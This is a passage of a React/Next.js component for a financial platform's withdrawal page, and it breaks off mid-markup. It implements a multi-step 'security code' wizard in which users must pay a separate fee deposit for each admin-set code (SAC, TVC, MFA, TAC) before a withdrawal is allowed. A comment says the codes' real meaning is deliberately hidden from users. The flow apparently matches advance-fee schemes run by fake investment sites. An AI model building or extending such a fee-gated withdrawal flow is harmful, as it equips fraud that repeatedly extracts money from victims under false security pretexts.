'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import Image from 'next/image';
import { ArrowUpDown, CreditCard, Clock, Calendar, ShieldCheck, X, Mail, KeyRound, CheckCircle2 } from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';
import { showSuccess, showError } from '@/utils/toast';
import { getPaymentMethods, PaymentMethod } from '@/lib/services/PaymentMethodService';
import { getCurrencySymbol } from '@/lib/currencies';
import { usePinPrompt } from './PinPrompt';

interface WithdrawalRequest {
  userId: string;
  paymentMethodId: string;
  amount: number;
  currency?: string;
  accountDetails: {
    accountName: string;
    accountNumber: string;
    bankName?: string;
    walletAddress?: string;
    network?: string;
  };
  status: 'pending' | 'processing' | 'completed' | 'rejected';
}

interface WithdrawalSchedule {
  enabled: boolean;
  allowedDays: string[];
  allowedTimes: {
    start: string;
    end: string;
  };
  timezone: string;
}

type CodeType = 'TPIN' | 'TAC' | 'MFA' | 'TVC' | 'SAC';

// Users only ever see the abbreviation. The full meaning (used by the
// admin panel) is intentionally hidden from end users.
const CODE_LABELS: Record<CodeType, { name: string; description: string }> = {
  TPIN: { name: 'TPIN', description: 'Your 4-digit security PIN.' },
  SAC: { name: 'SAC', description: 'A code required to access the withdrawal flow.' },
  TVC: { name: 'TVC', description: 'Confirms the specific withdrawal details.' },
  MFA: { name: 'MFA', description: 'A second-factor code sent to your verified contact.' },
  TAC: { name: 'TAC', description: 'A final code authorizing the withdrawal.' }
};

const CODE_FLOW_ORDER: CodeType[] = ['SAC', 'TVC', 'MFA', 'TAC'];

const WithdrawSection = () => {
  const { user, userProfile, forceRefresh } = useAuth();
  const currencyCode = userProfile?.currency || 'USD';
  const currencySymbol = getCurrencySymbol(currencyCode);
  const { promptForPin } = usePinPrompt();
  const [paymentMethods, setPaymentMethods] = useState<PaymentMethod[]>([]);
  const [selectedMethod, setSelectedMethod] = useState<PaymentMethod | null>(null);
  const [amount, setAmount] = useState('');
  const [accountName, setAccountName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [bankName, setBankName] = useState('');
  const [network, setNetwork] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [withdrawalSchedule, setWithdrawalSchedule] = useState<WithdrawalSchedule | null>(null);
  const [scheduleLoading, setScheduleLoading] = useState(true);

  const availableBalance = userProfile?.balances?.main || 0;
  const withdrawalAmount = parseFloat(amount) || 0;

  // Wizard state for the multi-code flow
  const [wizardOpen, setWizardOpen] = useState(false);
  const [wizardDraftId, setWizardDraftId] = useState<string | null>(null);
  const [wizardOrder, setWizardOrder] = useState<CodeType[]>([]);
  const [wizardIndex, setWizardIndex] = useState(0);
  const [wizardStep, setWizardStep] = useState<'deposit' | 'awaiting_deposit' | 'issue' | 'enter' | 'verify' | 'done'>('deposit');
  const [wizardIssueData, setWizardIssueData] = useState<{ code?: string; price: number; free: boolean } | null>(null);
  const [wizardEnteredCode, setWizardEnteredCode] = useState('');
  const [wizardProcessing, setWizardProcessing] = useState(false);
  const [wizardIssuedType, setWizardIssuedType] = useState<CodeType | null>(null);
  const [wizardError, setWizardError] = useState<string | null>(null);
  const [wizardDepositId, setWizardDepositId] = useState<string | null>(null);
  const [wizardDepositStatus, setWizardDepositStatus] = useState<string | null>(null);
  const [wizardPollCancel, setWizardPollCancel] = useState<(() => void) | null>(null);
  const [cancelConfirmOpen, setCancelConfirmOpen] = useState<null | 'resume'>(null);
  // The locked-in withdrawal amount for the active draft. Set when the
  // wizard opens (from the draft's amount field), then displayed
  // throughout the wizard so the user always sees the exact same
  // figure regardless of what happens to the underlying form state.
  const [wizardAmount, setWizardAmount] = useState<number>(0);
  const [wizardCurrency, setWizardCurrency] = useState<string>(currencyCode);

  // Active draft detection — show a "Resume withdrawal" banner if the
  // user has an in-progress draft from a previous session.
  const [activeDraft, setActiveDraft] = useState<{
    _id: string;
    amount: number;
    currency: string;
    codeState: Record<string, { paid: boolean; verified: boolean; required: boolean; price: number }>;
  } | null>(null);

  // Pending committed withdrawal requests (pending/processing). When
  // this is non-empty, the user cannot start a new withdrawal.
  const [pendingWithdrawals, setPendingWithdrawals] = useState<Array<{
    _id: string;
    amount: number;
    currency?: string;
    status: 'pending' | 'processing';
    createdAt: string;
  }>>([]);

  const refreshActiveDraft = async () => {
    try {
      const res = await fetch('/api/withdrawal/draft?amount=0&currency=' + encodeURIComponent(currencyCode));
      const json = await res.json();
      if (json.success && json.data?.draft) {
        setActiveDraft(json.data.draft);
      } else {
        setActiveDraft(null);
      }
    } catch {
      setActiveDraft(null);
    }
  };

  const refreshPendingWithdrawals = async () => {
    try {
      const res = await fetch('/api/user/withdrawals?status=open');
      const json = await res.json();
      if (json.success && Array.isArray(json.data)) {
        setPendingWithdrawals(json.data);
      } else {
        setPendingWithdrawals([]);
      }
    } catch {
      setPendingWithdrawals([]);
    }
  };

  useEffect(() => {
    const fetchWithdrawalSchedule = async () => {
      try {
        const response = await fetch('/api/withdrawal-schedule');
        const result = await response.json();
        if (result.success) {
          setWithdrawalSchedule(result.data);
        }
      } catch (error) {
        console.error('Error fetching withdrawal schedule:', error);
      } finally {
        setScheduleLoading(false);
      }
    };
    fetchWithdrawalSchedule();
    refreshActiveDraft();
    refreshPendingWithdrawals();
  }, [currencyCode]);

  const isWithdrawalAllowed = () => {
    if (!withdrawalSchedule || !withdrawalSchedule.enabled) return true;
    const now = new Date();
    const currentDay = now.toLocaleDateString('en-AU', { weekday: 'long' }).toLowerCase();
    const currentTime = now.toLocaleTimeString('en-AU', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit'
    });
    if (!withdrawalSchedule.allowedDays.includes(currentDay)) return false;
    const startTime = withdrawalSchedule.allowedTimes.start;
    const endTime = withdrawalSchedule.allowedTimes.end;
    return currentTime >= startTime && currentTime <= endTime;
  };

  const getNextAllowedTime = () => {
    if (!withdrawalSchedule || !withdrawalSchedule.enabled) return null;
    const now = new Date();
    const currentDay = now.toLocaleDateString('en-AU', { weekday: 'long' }).toLowerCase();
    const currentTime = now.toLocaleTimeString('en-AU', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit'
    });
    const daysOfWeek = ['sunday', 'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday'];
    const currentDayIndex = daysOfWeek.indexOf(currentDay);
    for (let i = 0; i < 7; i++) {
      const dayIndex = (currentDayIndex + i) % 7;
      const day = daysOfWeek[dayIndex];
      if (withdrawalSchedule.allowedDays.includes(day)) {
        const nextDate = new Date(now);
        nextDate.setDate(now.getDate() + i);
        if (i === 0 && currentTime < withdrawalSchedule.allowedTimes.start) {
          return { date: nextDate.toLocaleDateString(), time: withdrawalSchedule.allowedTimes.start, day };
        } else if (i > 0) {
          return { date: nextDate.toLocaleDateString(), time: withdrawalSchedule.allowedTimes.start, day };
        }
      }
    }
    return null;
  };

  const isAmountValid = withdrawalAmount <= availableBalance && withdrawalAmount > 0;
  const isFormValid = isAmountValid && selectedMethod && accountName && accountNumber && isWithdrawalAllowed() && pendingWithdrawals.length === 0;
  const hasPendingWithdrawal = pendingWithdrawals.length > 0;

  useEffect(() => {
    loadPaymentMethods();
  }, []);

  const loadPaymentMethods = async () => {
    try {
      const methods = await getPaymentMethods();
      setPaymentMethods(methods.filter((method: PaymentMethod) => method.isActive));
    } catch (error) {
      console.error('Error loading payment methods:', error);
      showError('An error occurred while loading payment methods');
    }
  };

  const resetForm = () => {
    setAmount('');
    setAccountName('');
    setAccountNumber('');
    setBankName('');
    setNetwork('');
    setSelectedMethod(null);
  };

  const resetWizard = () => {
    if (wizardPollCancel) wizardPollCancel();
    setWizardPollCancel(null);
    setWizardOpen(false);
    setWizardDraftId(null);
    setWizardOrder([]);
    setWizardIndex(0);
    setWizardStep('deposit');
    setWizardIssueData(null);
    setWizardEnteredCode('');
    setWizardProcessing(false);
    setWizardIssuedType(null);
    setWizardError(null);
    setWizardDepositId(null);
    setWizardDepositStatus(null);
    setWizardAmount(0);
    setWizardCurrency(currencyCode);
  };

  const cancelDraft = async (draftId: string) => {
    try {
      await fetch(`/api/withdrawal/draft?id=${encodeURIComponent(draftId)}`, { method: 'DELETE' });
    } catch (e) {
      console.error('Cancel draft error:', e);
    }
  };

  const submitDirect = async (pin: string) => {
    if (!selectedMethod) return;
    const withdrawalRequest: WithdrawalRequest = {
      userId: user?._id || '',
      paymentMethodId: selectedMethod._id,
      amount: withdrawalAmount,
      currency: currencyCode,
      accountDetails: {
        accountName,
        accountNumber,
        bankName: bankName || undefined,
        walletAddress: accountNumber,
        network: network || undefined
      },
      status: 'pending'
    };

    const response = await fetch('/api/transactions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'withdrawal', pin, ...withdrawalRequest })
    });
    const result = await response.json();
    if (!result.success) throw new Error(result.error || 'Failed to submit withdrawal request');
  };

  const runCodeFlow = async (pin: string) => {
    // 1) Preflight
    const preRes = await fetch(`/api/withdrawal/draft?amount=${encodeURIComponent(withdrawalAmount)}&currency=${encodeURIComponent(currencyCode)}`);
    const preJson = await preRes.json();
    if (!preJson.success) throw new Error(preJson.error || 'Preflight failed');

    const preflight = preJson.data?.preflight;
    const existingDraft = preJson.data?.draft;

    // Build the ordered list of paid codes from preflight.paidGateOrder
    const order: CodeType[] = Array.isArray(preflight?.paidGateOrder) ? preflight.paidGateOrder : [];
    const orderFromState: CodeType[] = preflight?.codeState
      ? Object.keys(preflight.codeState).filter((k) => k !== 'TPIN' && preflight.codeState[k].required) as CodeType[]
      : [];
    const finalOrder = order.length > 0 ? order : orderFromState;

    if (finalOrder.length === 0) {
      // No codes active — fall back to direct path
      await submitDirect(pin);
      return;
    }

    // 2) Create draft if needed (also re-uses an active draft if one is open)
    let draftId: string;
    let resumeIndex = 0;
    let resumeCodeState: Record<string, { paid: boolean; code?: string | null; verified: boolean }> | undefined;
    if (existingDraft && existingDraft.codeState) {
      // Resume the existing draft: skip already-verified codes, keep
      // paid-but-unverified codes intact (no need to pay again).
      const allVerified = finalOrder.every((k) => existingDraft.codeState[k]?.verified);
      if (allVerified) {
        // All done — jump to final submit step.
        setWizardDraftId(existingDraft._id);
        setWizardOrder(finalOrder);
        setWizardIndex(finalOrder.length);
        setWizardOpen(true);
        if (preflight?.codeState) initWizardPrices(preflight);
        setWizardAmount(existingDraft.amount ?? withdrawalAmount);
        setWizardCurrency(existingDraft.currency ?? currencyCode);
        setAmount('');
        setAccountName('');
        setAccountNumber('');
        setBankName('');
        setNetwork('');
        setSelectedMethod(null);
        setWizardStep('verify');
        return;
      }
      // Find the first unverified code to resume at.
      resumeIndex = finalOrder.findIndex((k) => !existingDraft.codeState[k]?.verified);
      resumeCodeState = existingDraft.codeState;
      draftId = existingDraft._id;
    } else {
      draftId = await createDraftWithPin(pin);
    }

    setWizardDraftId(draftId);
    setWizardOrder(finalOrder);
    setWizardIndex(resumeIndex);
    setWizardOpen(true);
    if (preflight?.codeState) initWizardPrices(preflight);
    // Lock in the amount for the wizard. Prefer the existing draft's
    // stored amount (so resume keeps the same value), otherwise use
    // the current form amount.
    const lockedAmount = existingDraft?.amount ?? withdrawalAmount;
    setWizardAmount(lockedAmount);
    setWizardCurrency(existingDraft?.currency ?? currencyCode);
    // Clear the form's amount field so the user can't edit it from
    // under the wizard.
    setAmount('');
    setAccountName('');
    setAccountNumber('');
    setBankName('');
    setNetwork('');
    setSelectedMethod(null);

    beginCodeStep(draftId, finalOrder, resumeIndex, resumeCodeState);
  };

  const createDraftWithPin = async (pin: string): Promise<string> => {
    if (!selectedMethod?._id) throw new Error('No payment method selected');
    const res = await fetch('/api/withdrawal/draft', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        amount: withdrawalAmount,
        currency: currencyCode,
        paymentMethodId: selectedMethod._id,
        accountDetails: {
          accountName,
          accountNumber,
          bankName: bankName || undefined,
          walletAddress: accountNumber,
          network: network || undefined
        },
        pin
      })
    });
    const json = await res.json();
    if (!json.success) throw new Error(json.error || 'Failed to start withdrawal');
    if (!json.data?._id) throw new Error('Server returned an invalid draft');
    return json.data._id;
  };

  // Begin a code step. For paid codes, create a deposit request tagged
  // for this draftId+codeType. For free codes, jump straight to issue.
  // If the slot is already paid (code issued but not yet verified), go
  // straight to the enter step — the user already paid and got the code.
  const beginCodeStep = (
    draftId: string,
    order: CodeType[],
    index: number,
    draftCodeState?: Record<string, { paid: boolean; code?: string | null; verified: boolean }>
  ) => {
    if (index >= order.length) {
      setWizardStep('verify');
      return;
    }
    const codeType = order[index];
    setWizardIssuedType(codeType);
    setWizardEnteredCode('');
    setWizardError(null);
    setWizardIssueData(null);
    setWizardDepositId(null);
    setWizardDepositStatus(null);

    const slot = draftCodeState?.[codeType];
    const alreadyVerified = !!slot && slot.verified;
    if (alreadyVerified) {
      // shouldn't happen but skip defensively
      beginCodeStep(draftId, order, index + 1, draftCodeState);
      return;
    }
    const alreadyPaidAndIssued = !!slot && slot.paid && !!slot.code && !slot.verified;
    if (alreadyPaidAndIssued) {
      // Code already issued for this slot — show the enter step using
      // the stored code so the user doesn't have to pay again.
      setWizardIssueData({
        code: slot!.code ?? undefined,
        price: preflightPrice(codeType),
        free: preflightPrice(codeType) === 0
      });
      setWizardStep('enter');
      setWizardProcessing(false);
      return;
    }
    // Slot is paid but no code was issued yet (e.g. user closed the
    // modal right after the fee deposit was approved before issue ran).
    // Re-call issue — the backend will detect the matched completed
    // deposit and generate the code without charging the user again.
    const alreadyPaidButNotIssued = !!slot && slot.paid && !slot.code && !slot.verified;
    if (alreadyPaidButNotIssued) {
      issueCurrentCode(draftId, codeType);
      return;
    }
    const draftPrice = preflightPrice(codeType);
    if (draftPrice > 0) {
      setWizardStep('deposit');
    } else {
      // Free code — go straight to issue
      issueCurrentCode(draftId, codeType);
    }
  };

  // We need the per-code price to render the deposit step. It's
  // available from preflight. Keep a small cache for the active draft.
  const [wizardPriceCache, setWizardPriceCache] = useState<Record<CodeType, number>>({} as Record<CodeType, number>);
  const preflightPrice = (codeType: CodeType): number => {
    return wizardPriceCache[codeType] ?? 0;
  };

  // Initialise price cache when the wizard opens. Pulled from the
  // preflight response we already fetched.
  const initWizardPrices = (preflight: { codeState: Record<string, { required: boolean; price: number }> }) => {
    const map: Record<string, number> = {};
    (Object.keys(preflight.codeState) as CodeType[]).forEach((k) => {
      if (k !== 'TPIN' && preflight.codeState[k].required) {
        map[k] = preflight.codeState[k].price;
      }
    });
    setWizardPriceCache(map as Record<CodeType, number>);
  };

  const createFeeDeposit = async () => {
    if (!wizardDraftId || !wizardIssuedType) return;
    if (!selectedMethod?._id) {
      setWizardError('No payment method selected. Please reselect a payment method.');
      return;
    }
    const price = preflightPrice(wizardIssuedType);
    setWizardProcessing(true);
    setWizardError(null);
    try {
      const res = await fetch('/api/transactions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'deposit',
          userId: user?._id || '',
          paymentMethodId: selectedMethod._id,
          amount: price,
          currency: currencyCode,
          metadata: {
            purpose: 'withdrawal_code_fee',
            draftId: wizardDraftId,
            codeType: wizardIssuedType
          }
        })
      });
      const json = await res.json();
      if (!json.success) throw new Error(json.error || 'Failed to create fee deposit');
      const depositId = String(json.data);
      setWizardDepositId(depositId);
      setWizardDepositStatus('pending_details');
      setWizardStep('awaiting_deposit');
      pollDepositStatus(depositId);
    } catch (e) {
      setWizardError(e instanceof Error ? e.message : 'Failed to create fee deposit');
    } finally {
      setWizardProcessing(false);
    }
  };

  const pollDepositStatus = async (depositId: string) => {
    let attempts = 0;
    let cancelled = false;
    const tick = async () => {
      if (cancelled) return;
      attempts += 1;
      try {
        const res = await fetch(`/api/user/deposits`);
        const json = await res.json();
        if (json.success) {
          const found = (json.data as Array<{ _id: string | { toString?: () => string }; status: string }>).find(
            (d) => String(d._id) === depositId
          );
          if (found) {
            setWizardDepositStatus(found.status);
            if (found.status === 'completed' && wizardDraftId && wizardIssuedType) {
              issueCurrentCode(wizardDraftId, wizardIssuedType);
              return;
            }
            if (found.status === 'rejected') {
              setWizardError('Your fee deposit was rejected. Please contact support or submit a new deposit.');
              return;
            }
          }
        }
      } catch (e) {
        console.error('Poll deposit error:', e);
      }
      if (attempts < 600 && !cancelled) {
        setTimeout(tick, 1000);
      } else if (!cancelled) {
        setWizardError('Deposit verification timed out. Please try again or contact support.');
      }
    };
    setWizardPollCancel(() => () => { cancelled = true; });
    setTimeout(tick, 1000);
  };

  const issueCurrentCode = async (draftId: string, codeType: CodeType) => {
    setWizardStep('issue');
    setWizardProcessing(true);
    setWizardError(null);
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15_000);
      const res = await fetch(`/api/withdrawal/codes/${codeType}/issue`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ draftId }),
        signal: controller.signal
      });
      clearTimeout(timeout);
      const json = await res.json();
      if (!json.success) throw new Error(json.error || 'Failed to issue code');

      const draft = json.data;
      const slot = draft?.codeState?.[codeType];
      const price = slot?.price ?? 0;
      const free = price === 0;
      setWizardIssueData({
        code: typeof slot?.code === 'string' ? slot.code : undefined,
        price,
        free
      });
      setWizardStep('enter');
      setWizardProcessing(false);
    } catch (e) {
      const message = e instanceof Error
        ? (e.name === 'AbortError' ? 'Code issuance timed out. Please try again.' : e.message)
        : 'Failed to issue code';
      setWizardError(message);
      setWizardProcessing(false);
      // If the slot was already paid but we couldn't get a code (e.g.
      // server error), bounce back to the enter step so the user can
      // retry issue rather than being stuck on the spinner.
      setWizardStep((current) => (current === 'issue' ? 'deposit' : current));
    }
  };

  const handleVerifyCode = async () => {
    if (!wizardDraftId || !wizardIssuedType) return;
    setWizardProcessing(true);
    setWizardError(null);
    try {
      const res = await fetch(`/api/withdrawal/codes/${wizardIssuedType}/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ draftId: wizardDraftId, code: wizardEnteredCode })
      });
      const json = await res.json();
      if (!json.success) throw new Error(json.error || 'Incorrect code');
      setWizardStep('verify');
      const next = wizardIndex + 1;
      setWizardIndex(next);
      if (next < wizardOrder.length) {
        // continue with the next code
        setTimeout(() => beginCodeStep(wizardDraftId, wizardOrder, next), 400);
      } else {
        setTimeout(() => setWizardStep('verify'), 400);
      }
    } catch (e) {
      setWizardError(e instanceof Error ? e.message : 'Verification failed');
    } finally {
      setWizardProcessing(false);
    }
  };

  const finalizeDraft = async (draftId: string) => {
    setWizardStep('done');
    setWizardProcessing(false);
    // TPIN was already captured when we created the draft, so submit will
    // re-verify it server-side. We need to pass it back here.
    // Easiest: read from the cached preflight state — but pin isn't kept.
    // The submit endpoint requires a pin; we don't have it. Approach:
    // re-create flow would be heavy. Instead, ask the user once more.
    setWizardDraftId(draftId);
    setWizardStep('verify');
  };

  const handleFinalSubmit = async () => {
    if (!wizardDraftId) return;
    const pin = await promptForPin('Enter your transaction PIN one more time to finalize this withdrawal.');
    if (!pin) return;
    setWizardProcessing(true);
    setWizardError(null);
    try {
      const res = await fetch('/api/withdrawal/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ draftId: wizardDraftId, pin })
      });
      const json = await res.json();
      if (!json.success) throw new Error(json.error || 'Failed to finalize withdrawal');
      setWizardStep('done');
      showSuccess('Withdrawal request submitted successfully! Please wait for admin processing.');
      resetForm();
      await forceRefresh();
      await refreshPendingWithdrawals();
      setTimeout(() => resetWizard(), 1200);
    } catch (e) {
      setWizardError(e instanceof Error ? e.message : 'Failed to submit');
    } finally {
      setWizardProcessing(false);
    }
  };

  // Close the wizard modal without cancelling the withdrawal. The draft
  // stays active and can be resumed via the banner. To actually cancel,
// the user must use the Cancel button next to Resume (or the explicit
// cancel flow opened from there).
const handleWizardClose = () => {
    resetWizard();
    refreshActiveDraft();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pendingWithdrawals.length > 0) {
      showError('You already have a pending withdrawal request. Please wait for it to be processed.');
      return;
    }
    if (!selectedMethod || !amount || !accountName || !accountNumber) {
      showError('Please fill in all required fields');
      return;
    }
    const localAmount = parseFloat(amount);
    const localBalance = userProfile?.balances?.main || 0;
    if (localAmount > localBalance) {
      showError(`Insufficient balance. Available balance: ${currencyCode} ${localBalance}`);
      return;
    }

    const pin = await promptForPin('Enter your transaction PIN to confirm this withdrawal request.');
    if (!pin) return;

    setIsSubmitting(true);
    try {
      // Try the multi-code path first; if no codes are active for this
      // user it falls through to the direct legacy submit.
      await runCodeFlow(pin);
    } catch (error) {
      console.error('Error submitting withdrawal request:', error);
      showError(error instanceof Error ? error.message : 'An error occurred while submitting your request');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Resume an in-progress withdrawal draft. Hydrates the wizard from
  // the draft's current state and jumps straight to the right step.
  const resumeActiveDraft = async () => {
    if (!activeDraft) return;
    const order: CodeType[] = (['SAC', 'TVC', 'MFA', 'TAC'] as CodeType[]).filter((k) => {
      const s = activeDraft.codeState[k];
      return s && s.required;
    });
    if (order.length === 0) {
      // No required codes for this draft — go straight to final submit
      setWizardDraftId(activeDraft._id);
      setWizardOrder(order);
      setWizardIndex(0);
      setWizardOpen(true);
      setWizardStep('verify');
      return;
    }
    const resumeIndex = order.findIndex((k) => !activeDraft.codeState[k]?.verified);
    if (resumeIndex === -1) {
      // All verified — go to final submit
      setWizardDraftId(activeDraft._id);
      setWizardOrder(order);
      setWizardIndex(order.length);
      setWizardOpen(true);
      setWizardStep('verify');
      return;
    }
    // Populate price cache from current draft so the deposit step
    // shows the right amount without re-fetching preflight.
    const priceMap: Record<string, number> = {};
    order.forEach((k) => {
      const s = activeDraft.codeState[k];
      if (s) priceMap[k] = s.price;
    });
    setWizardPriceCache(priceMap as Record<CodeType, number>);
    setWizardDraftId(activeDraft._id);
    setWizardOrder(order);
    setWizardIndex(resumeIndex);
    setWizardOpen(true);
    setWizardAmount(activeDraft.amount || 0);
    setWizardCurrency(activeDraft.currency || currencyCode);
    beginCodeStep(activeDraft._id, order, resumeIndex, activeDraft.codeState);
  };

  const cancelActiveDraft = () => {
    if (!activeDraft) return;
    setCancelConfirmOpen('resume');
  };

  const confirmResumeCancel = async () => {
    if (!activeDraft) {
      setCancelConfirmOpen(null);
      return;
    }
    const draftId = activeDraft._id;
    setCancelConfirmOpen(null);
    await cancelDraft(draftId);
    setActiveDraft(null);
    showSuccess('In-progress withdrawal cancelled.');
  };

  const currentCodeType = wizardIssuedType;
  const currentLabel = currentCodeType ? CODE_LABELS[currentCodeType] : null;
  const totalSteps = wizardOrder.length;
  const stepNumber = Math.min(wizardIndex + 1, totalSteps);

  return (
    <div className="px-0 py-4 mobile:px-6 mobile:py-6">
      <div className="bg-white rounded-none lg:rounded-lg shadow-none lg:shadow-lg p-0 lg:p-8">
        <div className="flex items-center space-x-3 mb-5 mobile:mb-8">
          <div>
            <h2 className="text-xl mobile:text-2xl font-bold text-gray-900">Request Withdrawal</h2>
            <p className="text-xs mobile:text-sm text-gray-600">Withdraw funds to your preferred payment method</p>
          </div>
        </div>

        {/* Pending withdrawal requests — blocks new ones */}
        {pendingWithdrawals.length > 0 && (
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <div className="flex items-start space-x-3">
              <Clock className="w-5 h-5 text-yellow-600 mt-0.5 shrink-0" />
              <div className="flex-1 min-w-0">
                <h3 className="font-semibold text-yellow-900 mb-1">
                  You have {pendingWithdrawals.length} pending withdrawal request{pendingWithdrawals.length === 1 ? '' : 's'}
                </h3>
                <p className="text-sm text-yellow-800">
                  A new withdrawal cannot be submitted until your pending request{pendingWithdrawals.length === 1 ? ' is' : 's are'} processed by an admin.
                </p>
                <ul className="mt-3 space-y-2">
                  {pendingWithdrawals.map((w) => (
                    <li key={w._id} className="flex items-center justify-between bg-white border border-yellow-100 rounded-lg px-3 py-2">
                      <div className="min-w-0">
                        <p className="text-sm font-semibold text-gray-900">
                          {getCurrencySymbol(w.currency || currencyCode)}{(w.amount || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </p>
                        <p className="text-xs text-gray-500">
                          Status: <strong className="capitalize">{w.status}</strong>
                          {' · '}
                          Submitted {new Date(w.createdAt).toLocaleString()}
                        </p>
                      </div>
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        )}

        {/* Resume in-progress withdrawal banner */}
        {activeDraft && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start justify-between">
              <div className="flex items-start space-x-3">
                <ArrowUpDown className="w-5 h-5 text-blue-600 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-blue-900 mb-1">You have an in-progress withdrawal</h3>
                  <p className="text-sm text-blue-800">
                    Amount: <strong>{getCurrencySymbol(activeDraft.currency || 'USD')}{(activeDraft.amount || 0).toLocaleString()}</strong>
                    {' — '}
                    {(() => {
                      const codes = (['SAC', 'TVC', 'MFA', 'TAC'] as CodeType[]).filter((k) => activeDraft.codeState[k]?.required);
                      const verifiedCount = codes.filter((k) => activeDraft.codeState[k]?.verified).length;
                      return `${verifiedCount} of ${codes.length} security codes verified`;
                    })()}
                  </p>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <button
                  onClick={resumeActiveDraft}
                  className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold rounded-lg"
                >
                  Resume
                </button>
                <button
                  onClick={cancelActiveDraft}
                  className="px-3 py-1.5 border border-blue-300 text-blue-700 hover:bg-blue-100 text-sm font-semibold rounded-lg"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {scheduleLoading ? (
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3"></div>
            </div>
          </div>
        ) : !isWithdrawalAllowed() ? (
          <div className="bg-orange-50 border border-orange-200 rounded-lg p-6 mb-6">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <Clock className="h-5 w-5 mobile:h-6 mobile:w-6 text-orange-600" />
              </div>
              <div className="ml-3">
                <h3 className="text-base mobile:text-lg font-semibold text-orange-800 mb-1 mobile:mb-2">
                  Withdrawals Currently Not Available
                </h3>
                <p className="text-xs mobile:text-sm text-orange-700 mb-3 mobile:mb-4">
                  Withdrawals are only allowed during specific days and times as set by our administrators.
                </p>
                {withdrawalSchedule && (
                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <Calendar className="h-4 w-4 text-orange-600" />
                      <span className="text-sm text-orange-700">
                        <strong>Allowed Days:</strong> {withdrawalSchedule.allowedDays.map(day =>
                          day.charAt(0).toUpperCase() + day.slice(1)
                        ).join(', ')}
                      </span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Clock className="h-4 w-4 text-orange-600" />
                      <span className="text-sm text-orange-700">
                        <strong>Allowed Times:</strong> {withdrawalSchedule.allowedTimes.start} - {withdrawalSchedule.allowedTimes.end} ({withdrawalSchedule.timezone})
                      </span>
                    </div>
                    {(() => {
                      const nextTime = getNextAllowedTime();
                      return nextTime && (
                        <div className="mt-3 p-3 bg-orange-100 rounded-lg">
                          <p className="text-sm text-orange-800">
                            <strong>Next Available:</strong> {nextTime.day.charAt(0).toUpperCase() + nextTime.day.slice(1)} at {nextTime.time}
                          </p>
                        </div>
                      );
                    })()}
                  </div>
                )}
              </div>
            </div>
          </div>
        ) : null}

        {userProfile?.kycStatus !== 'verified' && (
          <div className="bg-orange-50 border border-orange-200 rounded-lg p-6 mb-6">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <ShieldCheck className="h-6 w-6 text-orange-600" />
              </div>
              <div className="ml-3 flex-1">
                <h3 className="text-lg font-bold text-orange-800 mb-2">
                  KYC Verification Required
                </h3>
                <p className="text-sm text-orange-700 mb-4">
                  To ensure the security of your transactions and comply with financial regulations, you must complete your identity verification before making any withdrawals.
                </p>
                <div className="flex items-center space-x-4">
                  {userProfile?.kycStatus === 'pending' ? (
                    <div className="px-4 py-2 bg-orange-100 text-orange-800 rounded-xl font-bold flex items-center space-x-2">
                      <Clock className="w-5 h-5" />
                      <span>Verification Pending Review</span>
                    </div>
                  ) : (
                    <div className="text-sm font-bold text-navy-900 border-b-2 border-primary-500 pb-1">
                      Please complete Identity Verification via the sidebar
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        <div className={`transition-all duration-700 ${!isWithdrawalAllowed() && !scheduleLoading ? 'blur-md grayscale pointer-events-none opacity-50' : ''}`}>
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-sm font-medium text-gray-700">Available Balance:</span>
              <span className="text-lg font-bold text-gray-900">{currencySymbol}{(availableBalance).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className={`space-y-4 mobile:space-y-6 transition-all duration-700 ${(!isWithdrawalAllowed() && !scheduleLoading) || userProfile?.kycStatus !== 'verified' || hasPendingWithdrawal
          ? 'blur-md grayscale pointer-events-none opacity-40'
          : ''
          }`}>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-3">Select Withdrawal Method</label>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {paymentMethods.map((method) => (
                <motion.div
                  key={method._id}
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  className={`p-3 mobile:p-4 border-2 rounded-lg cursor-pointer transition-all ${selectedMethod?._id === method._id
                    ? 'border-[#0E5A50] bg-[#EDF2F0]'
